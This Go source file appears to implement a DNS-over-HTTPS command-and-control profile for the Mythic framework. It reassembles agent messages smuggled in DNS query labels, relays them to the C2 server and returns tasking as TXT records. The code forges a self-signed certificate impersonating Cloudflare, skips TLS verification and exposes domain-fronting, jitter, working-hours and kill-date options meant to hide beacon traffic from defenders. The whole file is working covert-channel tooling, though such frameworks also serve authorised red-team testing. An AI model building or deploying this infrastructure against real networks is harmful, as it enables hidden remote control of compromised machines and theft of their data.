package c2functions

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"strings"
	"sync"
	"time"

	c2structs "github.com/MythicMeta/MythicContainer/c2_structs"
	"github.com/MythicMeta/MythicContainer/config"
	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/utils/sharedStructs"
)

// ── Session store ─────────────────────────────────────────────────────────────

type sessionStore struct {
	mu       sync.Mutex
	sessions map[string]*sessionEntry
}

type sessionEntry struct {
	chunks  map[int][]byte
	total   int
	created time.Time
}

var store = &sessionStore{sessions: make(map[string]*sessionEntry)}

func (s *sessionStore) addChunk(sessionID string, seq, total int, data []byte) ([]byte, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	entry, ok := s.sessions[sessionID]
	if !ok {
		entry = &sessionEntry{chunks: make(map[int][]byte), total: total, created: time.Now()}
		s.sessions[sessionID] = entry
	}
	entry.chunks[seq] = data
	entry.total = total
	if len(entry.chunks) == total {
		assembled := make([]byte, 0)
		for i := 0; i < total; i++ {
			chunk, ok := entry.chunks[i]
			if !ok {
				return nil, false
			}
			assembled = append(assembled, chunk...)
		}
		delete(s.sessions, sessionID)
		return assembled, true
	}
	return nil, false
}

func (s *sessionStore) cleanup() {
	s.mu.Lock()
	defer s.mu.Unlock()
	cutoff := time.Now().Add(-5 * time.Minute)
	for k, v := range s.sessions {
		if v.created.Before(cutoff) {
			delete(s.sessions, k)
		}
	}
}

// ── DNS wire format ───────────────────────────────────────────────────────────

func buildDNSResponse(queryID uint16, queryName string, txtRecords []string) []byte {
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], queryID)
	binary.BigEndian.PutUint16(header[2:4], 0x8180)
	binary.BigEndian.PutUint16(header[4:6], 1)
	binary.BigEndian.PutUint16(header[6:8], uint16(len(txtRecords)))
	var buf []byte
	buf = append(buf, header...)
	buf = append(buf, encodeDNSName(queryName)...)
	buf = append(buf, 0, 16, 0, 1)
	for _, txt := range txtRecords {
		buf = append(buf, 0xc0, 0x0c, 0, 16, 0, 1, 0, 0, 0, 10)
		txtData := []byte(txt)
		rdLen := uint16(len(txtData) + 1)
		buf = append(buf, byte(rdLen>>8), byte(rdLen), byte(len(txtData)))
		buf = append(buf, txtData...)
	}
	return buf
}

func encodeDNSName(domain string) []byte {
	var buf []byte
	for _, label := range strings.Split(domain, ".") {
		buf = append(buf, byte(len(label)))
		buf = append(buf, []byte(label)...)
	}
	return append(buf, 0)
}

func parseDNSQuery(data []byte) (uint16, string, error) {
	if len(data) < 12 {
		return 0, "", fmt.Errorf("query too short")
	}
	queryID := binary.BigEndian.Uint16(data[0:2])
	if binary.BigEndian.Uint16(data[4:6]) == 0 {
		return 0, "", fmt.Errorf("no questions")
	}
	offset := 12
	name, offset, err := readDNSName(data, offset)
	if err != nil {
		return 0, "", err
	}
	if offset+4 > len(data) {
		return 0, "", fmt.Errorf("truncated question")
	}
	return queryID, name, nil
}

func readDNSName(data []byte, offset int) (string, int, error) {
	var labels []string
	for {
		if offset >= len(data) {
			return "", 0, fmt.Errorf("name out of bounds")
		}
		length := int(data[offset])
		if length == 0 {
			offset++
			break
		}
		if length&0xc0 == 0xc0 {
			if offset+1 >= len(data) {
				return "", 0, fmt.Errorf("pointer out of bounds")
			}
			ptr := int(binary.BigEndian.Uint16(data[offset:offset+2]) & 0x3fff)
			label, _, err := readDNSName(data, ptr)
			if err != nil {
				return "", 0, err
			}
			labels = append(labels, label)
			offset += 2
			break
		}
		offset++
		if offset+length > len(data) {
			return "", 0, fmt.Errorf("label out of bounds")
		}
		labels = append(labels, string(data[offset:offset+length]))
		offset += length
	}
	return strings.Join(labels, "."), offset, nil
}

// ── Mythic forwarding ─────────────────────────────────────────────────────────

var mythicClient = &http.Client{
	Timeout: 30 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
}

func forwardToMythic(ctx context.Context, assembled []byte, clientIP, forwardedURL string) ([]byte, error) {
	mythicURL := fmt.Sprintf("http://%s:%d/agent_message",
		config.MythicConfig.MythicServerHost,
		config.MythicConfig.MythicServerPort)
	encoded := base64.StdEncoding.EncodeToString(assembled)

	var lastErr error
	for retry := 0; retry < 3; retry++ {
		if retry > 0 {
			time.Sleep(time.Duration(500*(1<<(retry-1))) * time.Millisecond)
		}
		req, err := http.NewRequestWithContext(ctx, "POST", mythicURL, strings.NewReader(encoded))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/octet-stream")
		req.Header.Set("mythic", "doh")
		req.Header.Set("X-Forwarded-For", clientIP)
		req.Header.Set("x-forwarded-url", forwardedURL)
		resp, err := mythicClient.Do(req)
		if err != nil {
			lastErr = err
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			lastErr = err
			continue
		}
		if resp.StatusCode >= 500 {
			lastErr = fmt.Errorf("mythic %d", resp.StatusCode)
			continue
		}
		return body, nil
	}
	return nil, fmt.Errorf("forward failed: %w", lastErr)
}

// ── DoH HTTP handler ──────────────────────────────────────────────────────────

func dohHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("X-Content-Type-Options", "nosniff")
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", 405)
		return
	}
	if r.Header.Get("Content-Type") != "application/dns-message" {
		http.Error(w, "Unsupported Media Type", 415)
		return
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, 65535))
	if err != nil || len(body) == 0 {
		http.Error(w, "Bad Request", 400)
		return
	}
	queryID, queryName, err := parseDNSQuery(body)
	if err != nil {
		logging.LogError(err, "parseDNSQuery failed")
		http.Error(w, "Bad Request", 400)
		return
	}

	labels := strings.SplitN(queryName, ".", 5)
	if len(labels) < 5 {
		w.Header().Set("Content-Type", "application/dns-message")
		w.Write(buildDNSResponse(queryID, queryName, []string{"ok"}))
		return
	}

	hexData, seqHex, totalHex, sessionID := labels[0], labels[1], labels[2], labels[3]
	var seq, total int
	fmt.Sscanf(seqHex, "%x", &seq)
	fmt.Sscanf(totalHex, "%x", &total)
	if total == 0 {
		total = 1
	}

	chunkBytes, err := hex.DecodeString(hexData)
	if err != nil {
		logging.LogError(err, "hex decode failed")
		w.Header().Set("Content-Type", "application/dns-message")
		w.Write(buildDNSResponse(queryID, queryName, []string{"err:hex"}))
		return
	}

	assembled, complete := store.addChunk(sessionID, seq, total, chunkBytes)
	var txtRecords []string

	if !complete {
		txtRecords = []string{fmt.Sprintf("ack:%02x", seq)}
	} else {
		clientIP := r.RemoteAddr
		if fwd := r.Header.Get("X-Forwarded-For"); fwd != "" {
			clientIP = strings.Split(fwd, ",")[0]
		}
		responseBytes, err := forwardToMythic(r.Context(), assembled, clientIP, "/dns-query")
		if err != nil {
			logging.LogError(err, "Mythic forward error")
			txtRecords = []string{"err:mythic"}
		} else {
			decoded, decErr := base64.StdEncoding.DecodeString(strings.TrimSpace(string(responseBytes)))
			if decErr != nil {
				decoded = responseBytes
			}
			responseHex := hex.EncodeToString(decoded)
			const chunkSize = 200
			var chunks []string
			for i := 0; i < len(responseHex); i += chunkSize {
				end := i + chunkSize
				if end > len(responseHex) {
					end = len(responseHex)
				}
				chunks = append(chunks, responseHex[i:end])
			}
			if len(chunks) == 0 {
				chunks = []string{""}
			}
			for i, chunk := range chunks {
				txtRecords = append(txtRecords, fmt.Sprintf("%s.%02x.%02x", chunk, i, len(chunks)))
			}
			log.Printf("[doh] session=%s decoded=%dB chunks=%d", sessionID, len(decoded), len(chunks))
		}
	}

	w.Header().Set("Content-Type", "application/dns-message")
	w.Header().Set("Cache-Control", "no-store")
	w.Write(buildDNSResponse(queryID, queryName, txtRecords))
}

// ── TLS cert generation ───────────────────────────────────────────────────────

func generateSelfSignedCert() (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}
	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{Organization: []string{"Cloudflare, Inc."}, CommonName: "cloudflare.com"},
		DNSNames:     []string{"cloudflare.com", "*.cloudflare.com"},
		NotBefore:    time.Now().Add(-24 * time.Hour),
		NotAfter:     time.Now().Add(2 * 365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	certDER, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return tls.Certificate{}, err
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	return tls.X509KeyPair(certPEM, keyPEM)
}

// ── DoH HTTPS server ──────────────────────────────────────────────────────────

var dohHTTPServer *http.Server

func startDohServer(port string) {
	cert, err := generateSelfSignedCert()
	if err != nil {
		log.Fatalf("[doh] cert error: %v", err)
	}
	tlsCfg := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
		NextProtos:   []string{"h2", "http/1.1"},
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/dns-query", dohHandler)
	mux.HandleFunc("/health", func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(200) })
	dohHTTPServer = &http.Server{Addr: "0.0.0.0:" + port, Handler: mux, TLSConfig: tlsCfg}
	log.Printf("[doh] HTTPS server starting on :%s", port)
	go func() {
		if err := dohHTTPServer.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
			logging.LogError(err, "DoH server error")
		}
	}()
	go func() {
		t := time.NewTicker(time.Minute)
		defer t.Stop()
		for range t.C {
			store.cleanup()
		}
	}()
}

// ── Initialize registers the profile with Mythic ──────────────────────────────

func Initialize() {
	c2structs.AllC2Data.Get("doh").AddC2Definition(c2structs.C2Profile{
		Name:             "doh",
		Description:      "DNS-over-HTTPS (RFC 8484) C2 — agent traffic appears as legitimate DoH queries over HTTPS/TLS",
		IsP2p:            false,
		IsServerRouted:   true,
		ServerBinaryPath: "/app/doh-server",
		OnContainerStartFunction: func(ctx context.Context, msg sharedStructs.ContainerOnStartMessage) sharedStructs.ContainerOnStartMessageResponse {
			port := "4443"
			go startDohServer(port)
			return sharedStructs.ContainerOnStartMessageResponse{
				ContainerName:       msg.ContainerName,
				EventLogInfoMessage: "DoH C2 server started on port " + port,
			}
		},
		OPSECCheckFunction: func(_ context.Context, _ c2structs.C2OPSECMessage) c2structs.C2OPSECMessageResponse {
			return c2structs.C2OPSECMessageResponse{
				Success: true,
				Message: "Traffic appears as HTTPS/DoH (port 443, Content-Type: application/dns-message). Use fronting_domain for CDN redirector.",
			}
		},
		ConfigCheckFunction: func(_ context.Context, cfg c2structs.C2ConfigCheckMessage) c2structs.C2ConfigCheckMessageResponse {
			host := fmt.Sprintf("%v", cfg.Parameters["callback_host"])
			if host == "" || host == "<nil>" {
				return c2structs.C2ConfigCheckMessageResponse{Success: false, Error: "callback_host is required"}
			}
			return c2structs.C2ConfigCheckMessageResponse{Success: true}
		},
		GetIOCFunction: func(_ context.Context, msg c2structs.C2GetIOCMessage) c2structs.C2GetIOCMessageResponse {
			host := fmt.Sprintf("%v", msg.Parameters["callback_host"])
			port := fmt.Sprintf("%v", msg.Parameters["callback_port"])
			return c2structs.C2GetIOCMessageResponse{
				Success: true,
				IOCs: []c2structs.IOC{
					{Type: "url", IOC: fmt.Sprintf("https://%s:%s/dns-query", host, port)},
					{Type: "header", IOC: "Content-Type: application/dns-message"},
					{Type: "header", IOC: "Accept: application/dns-message"},
				},
			}
		},
	})

	c2structs.AllC2Data.Get("doh").AddParameters([]c2structs.C2Parameter{
		{Name: "callback_host", Description: "IP/hostname of the DoH C2 server", DefaultValue: "", Required: true, ParameterType: c2structs.C2_PARAMETER_TYPE_STRING},
		{Name: "callback_port", Description: "Port the DoH HTTPS server listens on", DefaultValue: "443", Required: true, ParameterType: c2structs.C2_PARAMETER_TYPE_NUMBER},
		{Name: "domain", Description: "Domain name used to structure DNS query labels", DefaultValue: "c2.example.com", Required: true, ParameterType: c2structs.C2_PARAMETER_TYPE_STRING},
		{Name: "callback_interval", Description: "Seconds between agent check-ins", DefaultValue: "10", Required: false, ParameterType: c2structs.C2_PARAMETER_TYPE_NUMBER},
		{Name: "callback_jitter", Description: "Jitter percentage (0-100) applied to callback_interval", DefaultValue: "10", Required: false, ParameterType: c2structs.C2_PARAMETER_TYPE_NUMBER},
		{Name: "AESPSK", Description: "Encryption key exchange method", DefaultValue: "aes256_hmac", Required: true, ParameterType: c2structs.C2_PARAMETER_TYPE_CHOOSE_ONE, Choices: []string{"aes256_hmac", "none"}},
		{Name: "encrypted_exchange_check", Description: "Perform encrypted key exchange on first check-in", DefaultValue: "true", Required: false, ParameterType: c2structs.C2_PARAMETER_TYPE_BOOLEAN},
		{Name: "killdate", Description: "Days until agent self-terminates (0 = never)", DefaultValue: 0, Required: false, ParameterType: c2structs.C2_PARAMETER_TYPE_NUMBER},
		{Name: "callback_hosts", Description: "Comma-separated fallback hosts (host:port) tried in order if primary fails", DefaultValue: "", Required: false, ParameterType: c2structs.C2_PARAMETER_TYPE_STRING},
		{Name: "proxy_url", Description: "HTTP/HTTPS proxy URL for agent traffic (e.g. http://proxy:8080)", DefaultValue: "", Required: false, ParameterType: c2structs.C2_PARAMETER_TYPE_STRING},
		{Name: "fronting_domain", Description: "CDN domain for domain fronting (TLS SNI); Host header stays as callback_host", DefaultValue: "", Required: false, ParameterType: c2structs.C2_PARAMETER_TYPE_STRING},
		{Name: "working_hours_start", Description: "Hour (0-23) to start beaconing; both 0 = always-on", DefaultValue: "0", Required: false, ParameterType: c2structs.C2_PARAMETER_TYPE_NUMBER},
		{Name: "working_hours_end", Description: "Hour (0-23) to stop beaconing", DefaultValue: "0", Required: false, ParameterType: c2structs.C2_PARAMETER_TYPE_NUMBER},
		{Name: "user_agent", Description: "Custom User-Agent header for DoH requests", DefaultValue: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", Required: false, ParameterType: c2structs.C2_PARAMETER_TYPE_STRING},
	})
}
